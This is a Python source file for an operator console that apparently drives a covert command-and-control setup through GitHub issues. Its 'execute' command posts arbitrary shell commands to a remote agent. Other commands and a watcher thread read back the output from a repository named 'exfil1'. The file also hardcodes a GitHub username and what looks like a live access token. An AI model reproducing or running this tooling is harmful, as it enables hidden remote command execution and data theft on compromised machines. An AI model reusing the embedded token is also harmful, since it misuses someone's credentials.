from __future__ import print_function
import cmd2
import threading,os, sys
from uuid import uuid4
from yaml import load, dump, scanner
from Queue import Queue
from time import sleep
from github import Github
from github.GithubException import GithubException
from github.GithubObject import NotSet
import ghlib

class ConCommander(cmd2.Cmd):
    def __init__(self):
      cmd2.Cmd.__init__(self)
      self.prompt="->> "

    def setup(self,data_q ):
      self.data_q=data_q
      self.out_watch=None

    def gitshell_watcher(self):
      t = threading.currentThread()
      print("Watcher thread {}".format(t))
      while getattr(t, "do_run", True):
        ghlib.checkIssueOutput(self.repo, self.data_q.get())
        sleep(1)
      print("Stopping RTM")

    def do_rtm(self, comm):
      """Real Time output monitoring"""
      print("Command {} received".format(comm))

      if comm == 'gshstart':
         if self.out_watch is None or (not self.out_watch.isAlive()):
            self.out_watch = threading.Thread(target=self.gitshell_watcher)
            self.out_watch.daemon=True
            print("Starting new thread ({})".format(comm))
            self.out_watch.start()
         else:
            print("Watchdog already running({})".format(self.out_watch.ident))

      if comm == 'gshstop':
         print("Wishing to stop thread ({})".format(comm))
         if self.out_watch is not None and self.out_watch.isAlive():
            self.out_watch.do_run=False
            self.out_watch.join()
         else:
            print("Watchdog not started")

    def do_rdq(self, line):
      """Read Data"""
      if not self.data_q.empty():
         print(self.data_q.get())

    def do_EOF(self, line):
      return True

    def postcmd(self, stop, line):
      if not self.data_q.empty():
        print("Queued ({}) ".format(self.data_q.qsize()))
      return stop

    def do_execute(self, arg):
      """execute <command [arguments]>
      Send `command` and its arguments to server """
      if arg:
         print("Executing {}".format(arg.parsed.dump()))
         stream = file(os.path.join(self.templatedir, 'execlocal.tmpl'), 'r')  
         instructions=load(stream)
         instructions['issue']['body']['request'][0]['execlocal']['command']=\
								arg.parsed.statement.args
         self.issue=ghlib.createIssueFromInstructions(self.agentid, self.repo, instructions)

         if self.issue is not None:
            print("Created task: ({}) - {}".format(self.issue.number, self.issue.title))
      else:
         print('Need command')

    def do_checkoutput(self, task_number):
      """checkoutput <task number>
      Check output of `task` from server """
      if task_number:
         print("Checking status and output of task ({})".format(task_number))
         ghlib.checkIssueOutput(self.repo, task_number)
      else:
         print('Need task number')

    def do_checkstates(self, top=5):
      """checkstates <number>
      Check status of tasks"""
      if top:
        print("Checking status of {} tasks for agent ({})".format(top, self.agentid))
        ghlib.checkIssueStates(self.repo, self.agentid, int(top))
      else:
        print("Need number of tasks  for agent:{} to check".format(self.agentid))



    def preloop(self):

      user_name="drtkn"
      token="dbba5bd20be0a59543762bd19e881d351ce118c7"
      repo_name="exfil1"

      self.agentid="a932e9f5-2501-4c60-b5da-8a61ac244792"
      self.g = Github(user_name, token)
      self.user=self.g.get_user()
      self.templatedir="./templates"
      #print("== List of repos  for user {}...".format(user))
      #for repo in self.g.get_user().get_repos():
      #  print(repo.name)

      self.reqfile="./instructions"
      self.repo=ghlib.checkRepoExists(self.user,repo_name)
      if self.repo is None:
         #repo.create_file('/agent1/filename2', 'commitmessage', 'content')
         #Create issue with a request
         self.repo=ghlib.createRepo(self.user,repo_name) 

